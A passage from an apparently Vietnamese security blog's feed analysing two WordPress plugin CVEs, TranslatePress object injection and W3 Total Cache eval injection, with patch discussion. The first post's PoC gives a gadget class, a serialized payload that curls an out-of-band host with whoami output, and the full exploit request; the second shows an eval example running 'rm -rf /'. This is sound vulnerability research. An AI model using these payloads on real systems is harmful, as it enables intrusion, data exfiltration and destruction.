data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#39; alt=&#34;Diff&#34; height=&#34;278&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay thế &lt;code&gt;unserialize()&lt;/code&gt; bằng &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Không còn dùng &lt;code&gt;unserialize()&lt;/code&gt; → loại bỏ hoàn toàn khả năng &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Hàm &lt;code&gt;trp_update_database()&lt;/code&gt; kiểm tra xem người dùng hiện tại có phải Administrator thông qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( apply_filters(&amp;#39;trp_update_database_capability&amp;#39;, &amp;#39;manage_options&amp;#39;) ) ){&#xA;    $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Your user account doesn\&amp;#39;t have the capability to perform database updates.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đồng thời, hàm cũng xác thực &lt;code&gt;nonce&lt;/code&gt; để ngăn chặn CSRF:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = isset( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ), &amp;#39;tpupdatedatabase&amp;#39; ) : false;&#xA;if ( $nonce === false ){&#xA;    $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Invalid nonce.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong trường hợp không có &lt;code&gt;nonce&lt;/code&gt;, lỗ hổng có thể bị khai thác bởi Unauthenticated khi admin bị dụ truy cập vào trang của attacker, từ đó trình duyệt gửi request kèm cookie của admin, quyền &lt;code&gt;manage_options&lt;/code&gt; luôn tồn tại và các logic phía sau sẽ được thực thi.&lt;/p&gt;&#xA;&lt;p&gt;Khi search với tên hàm &lt;code&gt;trp_update_database&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#34; title=&#34;Kết quả search trp_update_database&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;Kết quả search trp_update_database&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#39; alt=&#34;Search&#34; height=&#34;537&#34; width=&#34;1260&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả search trp_update_database&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;trp_update_database&lt;/code&gt; được đặt làm giá trị cho param &lt;code&gt;page&lt;/code&gt; =&amp;gt; &lt;code&gt;trp_update_database&lt;/code&gt; là callback và sẽ được gọi khi truy cập &lt;code&gt;/wp-admin/admin.php?page=trp_update_database&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Administrator visits /wp-admin/admin.php?page=trp_update_database&amp;#34;] --&amp;gt; B[&amp;#34;trp_update_database() invoked&amp;#34;]&#xA;&#xA;B --&amp;gt; C{&amp;#34;Check capability: current_user_can(manage_options)&amp;#34;}&#xA;C --&amp;gt;|Fail| X[&amp;#34;Stop &amp;amp; print error: insufficient privilege&amp;#34;]&#xA;C --&amp;gt;|Pass| D[&amp;#34;Verify nonce: wp_verify_nonce()&amp;#34;]&#xA;&#xA;D --&amp;gt;|Fail| Y[&amp;#34;Stop &amp;amp; print error: Invalid nonce&amp;#34;]&#xA;D --&amp;gt;|Pass| E[&amp;#34;Read trp_updb_extra_params&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;base64_decode()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;unserialize()&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Is payload malicious?&amp;#34;}&#xA;H --&amp;gt;|Yes| R[&amp;#34;Object Injection → Code Execution (RCE)&amp;#34;]&#xA;H --&amp;gt;|No| S[&amp;#34;Continue update process normally&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Cho request đi qua proxy của BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với trp_updb_extra_params chứa chuỗi serialized được encode base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;trp_updb_extra_params = base64_encode(&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:75:&amp;#34;curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)&amp;#34;;}&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: administrator_cookie&#xA;...&#xA;&#xA;action=trp_update_database&amp;amp;trp_updb_nonce=808dff22f9&amp;amp;initiate_update=true&amp;amp;trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ==&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#39; alt=&#34;Result&#34; height=&#34;379&#34; width=&#34;1073&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc &lt;code&gt;unserialize()&lt;/code&gt; được sử dụng trực tiếp trên dữ liệu người dùng mà không có xác thực bổ sung, tạo điều kiện cho việc khởi tạo đối tượng tùy ý và dẫn đến thực thi mã từ xa nếu payload độc hại được cung cấp. Khi kết hợp với khả năng khai thác CSRF, admin có thể bị lừa thực thi payload theo ý attacker. Việc chuyển sang &lt;code&gt;json_decode()&lt;/code&gt; trong bản vá 2.9.7 loại bỏ hoàn toàn bề mặt tấn công này và giải quyết triệt để lỗ hổng.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; trên dữ liệu không tin cậy luôn mang rủi ro Object Injection và có thể dẫn tới RCE.&lt;/li&gt;&#xA;&lt;li&gt;Cần xác thực và kiểm soát chặt chẽ dữ liệu người dùng trước khi xử lý.&lt;/li&gt;&#xA;&lt;li&gt;CSRF có thể nâng rủi ro từ “Authenticated exploit” thành “Silent exploitation”.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_decode()&lt;/code&gt; là lựa chọn an toàn hơn cho trao đổi dữ liệu giữa client và server.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra diff giữa bản lỗi và bản vá giúp nhanh chóng xác định nguyên nhân và phương pháp khắc phục.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/translatepress-multilingual/vulnerability/wordpress-translatepress-2-9-6-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin &amp;lt;= 2.9.6 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9501 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-22-cve-2025-9501/</link>
      <pubDate>Sat, 22 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-22-cve-2025-9501/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin W3 Total Cache WordPress trước phiên bản 2.8.13 tồn tại lỗ hổng command injection thông qua hàm _parse_dynamic_mfunc, cho phép người dùng chưa xác thực thực thi các lệnh PHP bằng cách gửi một comment chứa payload độc hại vào bài viết.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9501&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9501&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.8.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.8.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/w3-total-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;W3 Total Cache&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.12&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.13&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Theo như mô tả, lỗ hổng xuất phát từ hàm &lt;code&gt;_parse_dynamic_mfunc&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function _parse_dynamic_mfunc( $matches ) {&#xA;    $code1 = trim( $matches[1] );&#xA;    $code2 = trim( $matches[2] );&#xA;    $code  = ( $code1 ? $code1 : $code2 );&#xA;&#xA;    if ( $code ) {&#xA;        $code = trim( $code, &amp;#39;;&amp;#39; ) . &amp;#39;;&amp;#39;;&#xA;&#xA;        try {&#xA;            ob_start();&#xA;            $result = eval( $code );&#xA;            $output = ob_get_contents();&#xA;            ob_end_clean();&#xA;        } catch ( \Exception $ex ) {&#xA;            $result = false;&#xA;        }&#xA;&#xA;        if ( false === $result ) {&#xA;            $output = sprintf( &amp;#39;Unable to execute code: %s&amp;#39;, htmlspecialchars( $code ) );&#xA;        }&#xA;    } else {&#xA;        $output = htmlspecialchars( &amp;#39;Invalid mfunc tag syntax. The correct format is: &amp;lt;!-- W3TC_DYNAMIC_SECURITY mfunc PHP code --&amp;gt;&amp;lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&amp;gt; or &amp;lt;!-- W3TC_DYNAMIC_SECURITY mfunc --&amp;gt;PHP code&amp;lt;!-- /mfunc W3TC_DYNAMIC_SECURITY --&amp;gt;.&amp;#39; );&#xA;    }&#xA;&#xA;    return $output;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;eval()&lt;/code&gt; xuất hiện tại dòng 11. Nó là một hàm rất đặc biệt và nguy hiểm vì nó cho phép thực thi một chuỗi PHP như là code thực sự. Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$command = &amp;#39;system(&amp;#34;rm -rf /&amp;#34;)&amp;#39;;&#xA;eval($command);&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Khi plugin được install và active, nó sẽ thêm vào đầu dòng của &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/** Enable W3 Total Cache */&#xA;define(&amp;#39;WP_CACHE&amp;#39;, true); // Added by W3 Total Cache&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Dùng để đăng kí tính năng cache cho WordPress. 